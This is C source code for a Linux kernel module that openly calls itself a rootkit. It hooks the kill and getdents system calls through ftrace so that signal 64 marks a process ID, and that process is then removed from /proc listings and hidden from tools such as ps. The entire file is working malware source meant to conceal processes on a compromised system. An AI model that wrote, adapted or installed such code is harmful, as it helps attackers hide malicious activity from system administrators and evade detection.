#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#include "ftrace_rootkit_utils.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("LiNNNk");
MODULE_DESCRIPTION("Hides a process from the user.");
MODULE_VERSION("0.1");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
    #define PTREGS_SYSCALLS_STUBS 1
#endif

char pid_to_hide[NAME_MAX];

//Have to create our own since no longer part of headers
struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

#ifdef PTREGS_SYSCALLS_STUBS
    static asmlinkage long (*orig_kill)(const struct pt_regs*);
    static asmlinkage long (*orig_getdents64)(const struct pt_regs*);
    static asmlinkage long (*orig_getdents)(const struct pt_regs*);

    asmlinkage int hook_kill(const struct pt_regs* regs) {
        pid_t pid = regs->di;
        int sig = regs->si;

        if (sig == 64) {
            pr_info("hide_process_rootkit: Hiding process --> [%d]\n", pid);
            snprintf(pid_to_hide, NAME_MAX, "%d", pid);
            return 0;
        }

        return orig_kill(regs);
    }

 //FOR 64-BIT SYSTEMS
    asmlinkage int hook_getdents64(const struct pt_regs* regs) {

        struct linux_dirent64 __user* dirent = (struct linux_dirent64*)regs->si;
        struct linux_dirent64* kernel_dir = NULL;               // used to copy from user buffer
        struct linux_dirent64* current_dir = NULL;              // used to iterate thru buffer
        struct linux_dirent64* previous_dir = NULL;             // used to iterate
        unsigned long offset = 0;                               // used to iterate thru buffer
        long bytes_in_buffer = orig_getdents64(regs);           // gets size of buffer
        kernel_dir = kzalloc(bytes_in_buffer, GFP_KERNEL);

        // Check if either failed aboved
        if ((bytes_in_buffer <= 0) || (kernel_dir == NULL)) {
            return bytes_in_buffer;
        }

        // Copy user buffer to our kernel buffer
        long error;
        error = copy_from_user(kernel_dir, dirent, bytes_in_buffer);
        if (error) {
            goto done;
        }

        while (offset < bytes_in_buffer) {
            // set to beginning of buffer and cast to void* to increment by byte
            current_dir = (void*)kernel_dir + offset;

            // Check to see if pid matches the d_name within /proc/<pid>
            // Must also check if pid isn't blank or every directory is hidden on the system
            if ((memcmp(pid_to_hide, current_dir->d_name, strlen(pid_to_hide)) == 0) &&
                (strncmp(pid_to_hide, "", NAME_MAX) != 0)) {
                //Check if its the first entry
                if (current_dir == kernel_dir) {
                    //Decrement bytes_in_buffer and shift all structs up in memory
                    bytes_in_buffer = bytes_in_buffer - current_dir->d_reclen;
                    memmove(current_dir, (void*)current_dir + current_dir->d_reclen, bytes_in_buffer);
                    continue; //so we don't increment offset and continue to iterate with new head
                }
                //Hide the secret entry by incrementing d_reclen of previous_dir by
                //that of the entry we want to hide - effectively "swallowing" it
                previous_dir->d_reclen = previous_dir->d_reclen + current_dir->d_reclen;
            } else {
                //Set previous_dir to current_dir before looping where current_dir
                //gets incremented to the next entry
                previous_dir = current_dir;
            }

            // add to the offset the size of the directory
            offset = offset + current_dir->d_reclen;
        }

        error = copy_to_user(dirent, kernel_dir, bytes_in_buffer);
        if (error) {
            goto done;
        }

    done:
        kfree(kernel_dir);
        return bytes_in_buffer;
    }

    //FOR 32-BIT SYSTEMS
    asmlinkage int hook_getdents(const struct pt_regs* regs) {

        struct linux_dirent __user* dirent = (struct linux_dirent*)regs->si;
        struct linux_dirent* kernel_dir = NULL;               // used to copy from user buffer
        struct linux_dirent* current_dir = NULL;              // used to iterate thru buffer
        struct linux_dirent* previous_dir = NULL;             // used to iterate
        unsigned long offset = 0;                             // used to iterate thru buffer
        long bytes_in_buffer = orig_getdents(regs);           // gets size of buffer
        kernel_dir = kzalloc(bytes_in_buffer, GFP_KERNEL);

        // Check if either failed aboved
        if ((bytes_in_buffer <= 0) || (kernel_dir == NULL)) {
            return bytes_in_buffer;
        }

        // Copy user buffer to our kernel buffer
        long error;
        error = copy_from_user(kernel_dir, dirent, bytes_in_buffer);
        if (error) {
            goto done;
        }

        while (offset < bytes_in_buffer) {
            // set to beginning of buffer and cast to void* to increment by byte
            current_dir = (void*)kernel_dir + offset;

            // Check to see if pid matches the d_name within /proc/<pid>
            // Must also check if pid isn't blank or every directory is hidden on the system
            if ((memcmp(pid_to_hide, current_dir->d_name, strlen(pid_to_hide)) == 0) &&
                (strncmp(pid_to_hide, "", NAME_MAX) != 0)) {
                //Check if its the first entry
                if (current_dir == kernel_dir) {
                    //Decrement bytes_in_buffer and shift all structs up in memory
                    bytes_in_buffer = bytes_in_buffer - current_dir->d_reclen;
                    memmove(current_dir, (void*)current_dir + current_dir->d_reclen, bytes_in_buffer);
                    continue; //so we don't increment offset and continue to iterate with new head
                }
                //Hide the secret entry by incrementing d_reclen of previous_dir by
                //that of the entry we want to hide - effectively "swallowing" it
                previous_dir->d_reclen = previous_dir->d_reclen + current_dir->d_reclen;
            } else {
                //Set previous_dir to current_dir before looping where current_dir
                //gets incremented to the next entry
                previous_dir = current_dir;
            }

            // add to the offset the size of the directory
            offset = offset + current_dir->d_reclen;
        }

        error = copy_to_user(dirent, kernel_dir, bytes_in_buffer);
        if (error) {
            goto done;
        }

    done:
        kfree(kernel_dir);
        return bytes_in_buffer;
    }

#else
    static asmlinkage long (*orig_kill)(pid_t pid, int sig);
    static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64* dirent, unsigned int count);
    static asmlinkage long (*orig_getdents) (unsigned int fd, struct linux_dirent* dirent, unsigned int count);

    asmlinkage int hook_kill(pid_t pid, int sig) {
        if (sig == 64) {
            pr_info("hide_process_rootkit: Hiding process --> [%d]\n", pid);
            snprintf(pid_to_hide, NAME_MAX, "%d", pid);
            return 0;
        }

        return orig_kill(pid, sig);
    }

 //FOR 64-BIT SYSTEMS
    asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64* dirent, unsigned int count) {

        struct linux_dirent64* kernel_dir = NULL;                   // used to copy from user buffer
        struct linux_dirent64* current_dir = NULL;                  // used to iterate thru buffer
        struct linux_dirent64* previous_dir = NULL;                 // used to iterate
        unsigned long offset = 0;                                   // used to iterate thru buffer
        long bytes_in_buffer = orig_getdents64(fd, dirent, count);  // gets size of buffer
        kernel_dir = kzalloc(bytes_in_buffer, GFP_KERNEL);

        // Check if either failed aboved
        if ((bytes_in_buffer <= 0) || (kernel_dir == NULL)) {
            return bytes_in_buffer;
        }

        // Copy user buffer to our kernel buffer
        long error;
        error = copy_from_user(kernel_dir, dirent, bytes_in_buffer);
        if (error) {
            goto done;
        }

        while (offset < bytes_in_buffer) {
            // set to beginning of buffer and cast to void* to increment by byte
            current_dir = (void*)kernel_dir + offset;

            // Check to see if pid matches the d_name within /proc/<pid>
            // Must also check if pid isn't blank or every directory is hidden on the system
            if ((memcmp(pid_to_hide, current_dir->d_name, strlen(pid_to_hide)) == 0) &&
                (strncmp(pid_to_hide, "", NAME_MAX) != 0)) {
                //Check if its the first entry
                if (current_dir == kernel_dir) {
                    //Decrement bytes_in_buffer and shift all structs up in memory
                    bytes_in_buffer = bytes_in_buffer - current_dir->d_reclen;
                    memmove(current_dir, (void*)current_dir + current_dir->d_reclen, bytes_in_buffer);
                    continue; //so we don't increment offset and continue to iterate with new head
                }
                //Hide the secret entry by incrementing d_reclen of previous_dir by
                //that of the entry we want to hide - effectively "swallowing" it
                previous_dir->d_reclen = previous_dir->d_reclen + current_dir->d_reclen;
            } else {
                //Set previous_dir to current_dir before looping where current_dir
                //gets incremented to the next entry
                previous_dir = current_dir;
            }

            // add to the offset the size of the directory
            offset = offset + current_dir->d_reclen;
        }

        error = copy_to_user(dirent, kernel_dir, bytes_in_buffer);
        if (error) {
            goto done;
        }

    done:
        kfree(kernel_dir);
        return bytes_in_buffer;
    }

    //FOR 32-BIT SYSTEMS
    asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent* dirent, unsigned int count) {

        struct linux_dirent* kernel_dir = NULL;                     // used to copy from user buffer
        struct linux_dirent* current_dir = NULL;                    // used to iterate thru buffer
        struct linux_dirent* previous_dir = NULL;                   // used to iterate
        unsigned long offset = 0;                                   // used to iterate thru buffer
        long bytes_in_buffer = orig_getdents(fd, dirent, count);    // gets size of buffer
        kernel_dir = kzalloc(bytes_in_buffer, GFP_KERNEL);

        // Check if either failed aboved
        if ((bytes_in_buffer <= 0) || (kernel_dir == NULL)) {
            return bytes_in_buffer;
        }

        // Copy user buffer to our kernel buffer
        long error;
        error = copy_from_user(kernel_dir, dirent, bytes_in_buffer);
        if (error) {
            goto done;
        }

        while (offset < bytes_in_buffer) {
            // set to beginning of buffer and cast to void* to increment by byte
            current_dir = (void*)kernel_dir + offset;

            // Check to see if pid matches the d_name within /proc/<pid>
            // Must also check if pid isn't blank or every directory is hidden on the system
            if ((memcmp(pid_to_hide, current_dir->d_name, strlen(pid_to_hide)) == 0) &&
                (strncmp(pid_to_hide, "", NAME_MAX) != 0)) {
                //Check if its the first entry
                if (current_dir == kernel_dir) {
                    //Decrement bytes_in_buffer and shift all structs up in memory
                    bytes_in_buffer = bytes_in_buffer - current_dir->d_reclen;
                    memmove(current_dir, (void*)current_dir + current_dir->d_reclen, bytes_in_buffer);
                    continue; //so we don't increment offset and continue to iterate with new head
                }
                //Hide the secret entry by incrementing d_reclen of previous_dir by
                //that of the entry we want to hide - effectively "swallowing" it
                previous_dir->d_reclen = previous_dir->d_reclen + current_dir->d_reclen;
            } else {
                //Set previous_dir to current_dir before looping where current_dir
                //gets incremented to the next entry
                previous_dir = current_dir;
            }

            // add to the offset the size of the directory
            offset = offset + current_dir->d_reclen;
        }

        error = copy_to_user(dirent, kernel_dir, bytes_in_buffer);
        if (error) {
            goto done;
        }

    done:
        kfree(kernel_dir);
        return bytes_in_buffer;
    }
#endif

static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("sys_getdents", hook_getdents, &orig_getdents),
};

static int __init hide_process_rootkit_init(void) {
    int err;
    err = install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }
    pr_info("hide_process_rootkit: loaded\n");
    return 0;
}

static void __exit hide_process_rootkit_exit(void) {
    remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("hide_process_rootkit: unloaded\n");
}

module_init(hide_process_rootkit_init);
module_exit(hide_process_rootkit_exit);
